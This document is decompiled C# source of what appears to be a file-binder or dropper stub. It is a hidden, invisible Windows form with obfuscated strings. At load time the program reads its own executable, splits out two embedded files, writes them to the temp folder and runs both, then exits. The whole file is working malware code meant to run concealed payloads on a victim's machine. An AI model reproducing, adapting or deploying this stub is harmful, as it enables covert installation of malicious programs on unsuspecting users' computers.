using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace ns1;

[DesignerGenerated]
public class GForm0 : Form
{
	private static List<WeakReference> __ENCList = new List<WeakReference>();

	private IContainer components;

	[DebuggerNonUserCode]
	public GForm0()
	{
		((Form)this).add_Load((EventHandler)GForm0_Load);
		smethod_0(this);
		method_0();
	}

	[DebuggerNonUserCode]
	private static void smethod_0(object object_0)
	{
		checked
		{
			lock (__ENCList)
			{
				if (__ENCList.Count == __ENCList.Capacity)
				{
					int num = 0;
					int num2 = __ENCList.Count - 1;
					int num3 = 0;
					while (true)
					{
						int num4 = num3;
						int num5 = num2;
						if (num4 > num5)
						{
							break;
						}
						WeakReference weakReference = __ENCList[num3];
						if (weakReference.IsAlive)
						{
							if (num3 != num)
							{
								__ENCList[num] = __ENCList[num3];
							}
							num++;
						}
						num3++;
					}
					__ENCList.RemoveRange(num, __ENCList.Count - num);
					__ENCList.Capacity = __ENCList.Count;
				}
				__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(object_0)));
			}
		}
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if ((disposing && components != null) ? true : false)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void method_0()
	{
		((Control)this).SuspendLayout();
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_AutoSizeMode((AutoSizeMode)0);
		Size clientSize = new Size(10, 10);
		((Form)this).set_ClientSize(clientSize);
		((Form)this).set_ControlBox(false);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name(GClass0.smethod_0("hŪɢ\u036cѰլ"));
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Control)this).ResumeLayout(false);
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	private void GForm0_Load(object sender, EventArgs e)
	{
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		string tempPath = default(string);
		string[] array = default(string[]);
		string text = default(string);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_000a;
				case 404:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0001;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_000a;
						case 3:
							goto IL_0013;
						case 4:
							goto IL_0026;
						case 5:
							goto IL_0036;
						case 6:
							goto IL_004b;
						case 7:
							goto IL_005f;
						case 8:
							goto IL_0075;
						case 9:
							goto IL_008c;
						case 10:
							goto IL_00a3;
						case 11:
							goto IL_00b8;
						case 12:
							goto IL_00d0;
						case 13:
							goto IL_00e7;
						case 14:
							goto IL_00fc;
						case 15:
							goto IL_010f;
						case 16:
							goto IL_0122;
						case 17:
							goto end_IL_0001_2;
						default:
							goto end_IL_0001;
						case 18:
							goto end_IL_0001_3;
						}
						goto default;
					}
					IL_0122:
					num = 16;
					((Form)this).Close();
					break;
					IL_010f:
					num = 15;
					Process.Start(tempPath + array[4]);
					goto IL_0122;
					IL_000a:
					num = 2;
					tempPath = Path.GetTempPath();
					goto IL_0013;
					IL_0013:
					num = 3;
					FileSystem.FileOpen(1, Application.get_ExecutablePath(), (OpenMode)32, (OpenAccess)1, (OpenShare)3, -1);
					goto IL_0026;
					IL_0026:
					num = 4;
					text = Strings.Space(checked((int)FileSystem.LOF(1)));
					goto IL_0036;
					IL_0036:
					num = 5;
					FileSystem.FileGet(1, ref text, -1L, false);
					goto IL_004b;
					IL_004b:
					num = 6;
					FileSystem.FileClose(new int[1] { 1 });
					goto IL_005f;
					IL_005f:
					num = 7;
					array = Strings.Split(text, GClass0.smethod_0("oĹɺ\u036bѢը٠ܪࡠ७੬"), -1, (CompareMethod)0);
					goto IL_0075;
					IL_0075:
					num = 8;
					FileSystem.FileOpen(3, tempPath + array[3], (OpenMode)32, (OpenAccess)3, (OpenShare)(-1), -1);
					goto IL_008c;
					IL_008c:
					num = 9;
					FileSystem.FilePut(3, array[1], -1L, false);
					goto IL_00a3;
					IL_00a3:
					num = 10;
					FileSystem.FileClose(new int[1] { 3 });
					goto IL_00b8;
					IL_00b8:
					num = 11;
					FileSystem.FileOpen(5, tempPath + array[4], (OpenMode)32, (OpenAccess)3, (OpenShare)(-1), -1);
					goto IL_00d0;
					IL_00d0:
					num = 12;
					FileSystem.FilePut(5, array[2], -1L, false);
					goto IL_00e7;
					IL_00e7:
					num = 13;
					FileSystem.FileClose(new int[1] { 5 });
					goto IL_00fc;
					IL_00fc:
					num = 14;
					Process.Start(tempPath + array[3]);
					goto IL_010f;
					end_IL_0001_2:
					break;
				}
				num = 17;
				Application.Exit();
				break;
				end_IL_0001:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 404;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}
}
